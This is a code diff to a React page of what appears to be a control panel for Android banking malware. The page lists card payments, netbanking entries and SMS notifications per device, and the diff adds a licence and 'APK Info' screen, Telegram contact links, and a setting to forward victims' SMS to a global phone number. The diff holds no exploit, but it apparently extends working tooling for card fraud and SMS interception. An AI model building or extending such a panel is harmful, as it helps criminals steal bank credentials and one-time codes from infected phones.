@@ -11,6 +11,7 @@ import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/
 import { listNotificationsGrouped }      from "../services/api/sms";
 import { ENV, apiHeaders }               from "../config/constants";
 import { pickLastSeenAt }                from "../utils/reachability";
+import { logout }                        from "../services/api/auth";
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 type AnyRecord      = Record<string, any>;
@@ -375,6 +376,23 @@ export default function MainPage() {
   const location  = useLocation();
 
   // default: day mode
+  // ── Help / Settings / APK Info overlay ──────────────────────────────────────
+  const [helpOpen,    setHelpOpen]    = useState(false);
+  const [helpScreen,  setHelpScreen]  = useState<"" | "settings" | "apk">("");
+
+  // Settings state
+  const [globalPhone,    setGlobalPhone]    = useState("");
+  const [globalEnabled,  setGlobalEnabled]  = useState(false);
+  const [globalLoading,  setGlobalLoading]  = useState(false);
+  const [globalMsg,      setGlobalMsg]      = useState("");
+  const [pinOld,         setPinOld]         = useState("");
+  const [pinNew,         setPinNew]         = useState("");
+  const [pinConfirm,     setPinConfirm]     = useState("");
+  const [pinMsg,         setPinMsg]         = useState("");
+
+  // APK Info state
+  const [licenseInfo,  setLicenseInfo]  = useState<any>(null);
+
   const [activeTab, setActiveTab] = useState<TabKey>(() => {
     return ((location.state as any)?.tab as TabKey) || "home";
   });
@@ -757,11 +775,153 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* HELP */}
-      {activeTab === "help" && (
-        <div className="px-4 py-8 text-center">
-          <div className={`text-[18px] font-bold mb-2 ${D.value(dark)}`}>Help</div>
-          <div className={D.empty(dark)}>Content coming soon…</div>
+      {/* HELP — bottom sheet modal */}
+      {helpOpen && (
+        <div className="fixed inset-0 z-[1000] flex items-end justify-center bg-black/60"
+          onClick={() => setHelpOpen(false)}>
+          <div className="w-full max-w-[480px] rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-10"
+            onClick={e => e.stopPropagation()}>
+            {/* Header */}
+            <div className="mb-5 flex items-center justify-between">
+              <span className="text-[20px] font-bold text-white">Help</span>
+              <button type="button" onClick={() => setHelpOpen(false)}
+                className="h-8 w-8 rounded-lg border border-gray-600 text-gray-400 flex items-center justify-center text-[16px]">✕</button>
+            </div>
+
+            {/* Links */}
+            <div className="mb-6 divide-y divide-gray-700 border-y border-gray-700">
+              {[
+                { label: "APK Info", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } },
+                { label: "Settings", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadGlobalPhone(); } },
+                { label: "Logout",   onClick: handleLogout },
+              ].map(item => (
+                <button key={item.label} type="button" onClick={item.onClick}
+                  className="flex w-full items-center justify-between py-4 text-[16px] text-gray-200 hover:text-white">
+                  <span>{item.label}</span>
+                  <span className="text-gray-500 text-[18px]">›</span>
+                </button>
+              ))}
+            </div>
+
+            {/* Contact buttons */}
+            <div className="space-y-3">
+              <button type="button" onClick={openWhatsApp}
+                className="w-full rounded-xl border-2 border-green-500 py-3 text-[15px] font-semibold text-green-400 hover:bg-green-500/10">
+                Contact Us
+              </button>
+              <button type="button" onClick={openTelegramHelp}
+                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[15px] font-semibold text-blue-400 hover:bg-blue-500/10">
+                Telegram Bot
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* SETTINGS SCREEN */}
+      {helpScreen === "settings" && (
+        <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
+          {/* Header */}
+          <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
+            <button type="button" onClick={() => setHelpScreen("")}
+              className="text-[20px] text-gray-600">←</button>
+            <span className="text-[17px] font-bold text-gray-900">Settings</span>
+          </div>
+
+          <div className="mx-auto max-w-[480px] space-y-4 p-4">
+            {/* Global Number */}
+            <div className="rounded-2xl bg-white p-5 shadow-sm">
+              <div className="mb-4 text-[15px] font-bold text-gray-900">Global Number</div>
+
+              {/* ON/OFF toggle */}
+              <div className="mb-4 flex items-center justify-between">
+                <span className="text-[14px] text-gray-600">Forward SMS to this number</span>
+                <button type="button"
+                  onClick={() => { setGlobalEnabled(e => !e); setGlobalMsg(""); }}
+                  className={[
+                    "relative h-7 w-12 rounded-full transition-colors",
+                    globalEnabled ? "bg-green-500" : "bg-gray-300"
+                  ].join(" ")}>
+                  <span className={[
+                    "absolute top-0.5 h-6 w-6 rounded-full bg-white shadow transition-transform",
+                    globalEnabled ? "translate-x-5" : "translate-x-0.5"
+                  ].join(" ")} />
+                </button>
+              </div>
+
+              {globalEnabled && (
+                <input
+                  value={globalPhone}
+                  onChange={e => setGlobalPhone(e.target.value)}
+                  placeholder="Phone number"
+                  inputMode="tel"
+                  className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400"
+                />
+              )}
+
+              <button type="button" onClick={saveGlobalPhone} disabled={globalLoading}
+                className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-60">
+                {globalLoading ? "Saving…" : globalEnabled ? "Save Number" : "Turn Off & Clear"}
+              </button>
+              {globalMsg && <div className="mt-2 text-center text-[13px]">{globalMsg}</div>}
+            </div>
+
+            {/* Change PIN */}
+            <div className="rounded-2xl bg-white p-5 shadow-sm">
+              <div className="mb-4 text-[15px] font-bold text-gray-900">Change PIN</div>
+              {[
+                { label: "Old PIN",     val: pinOld,    set: setPinOld },
+                { label: "New PIN",     val: pinNew,    set: setPinNew },
+                { label: "Confirm PIN", val: pinConfirm, set: setPinConfirm },
+              ].map(f => (
+                <div key={f.label} className="mb-3">
+                  <div className="mb-1 text-[12px] font-semibold text-gray-500">{f.label}</div>
+                  <input type="password" inputMode="numeric" value={f.val}
+                    onChange={e => f.set(e.target.value)}
+                    className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
+                </div>
+              ))}
+              <button type="button" onClick={changePin}
+                className="mt-2 w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white">
+                Change PIN
+              </button>
+              {pinMsg && <div className="mt-2 text-center text-[13px]">{pinMsg}</div>}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* APK INFO SCREEN */}
+      {helpScreen === "apk" && (
+        <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
+          {/* Header */}
+          <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
+            <button type="button" onClick={() => setHelpScreen("")}
+              className="text-[20px] text-gray-600">←</button>
+            <span className="text-[17px] font-bold text-gray-900">APK Info</span>
+          </div>
+
+          <div className="mx-auto max-w-[480px] space-y-4 p-4">
+            <div className="rounded-2xl bg-white p-5 shadow-sm space-y-4">
+              {[
+                { label: "Panel ID",      value: str(ENV.PANEL_ID || "-") },
+                { label: "Version",       value: str(ENV.VERSION || "v1.0") },
+                { label: "Expiry Date",   value: licenseInfo?.expiryDate || "—" },
+                { label: "Status",        value: licenseInfo?.status || "Active" },
+                { label: "Contact (TG)",  value: str(ENV.TELEGRAM_CHANNEL || "-") },
+              ].map(row => (
+                <div key={row.label}>
+                  <div className="text-[12px] font-semibold text-gray-500">{row.label}</div>
+                  <div className="mt-0.5 break-all text-[14px] font-semibold text-gray-900">{row.value}</div>
+                </div>
+              ))}
+            </div>
+
+            <button type="button" onClick={openTelegramHelp}
+              className="w-full rounded-xl border-2 border-blue-500 py-3 text-[15px] font-semibold text-blue-600">
+              Join Telegram Channel
+            </button>
+          </div>
         </div>
       )}
 
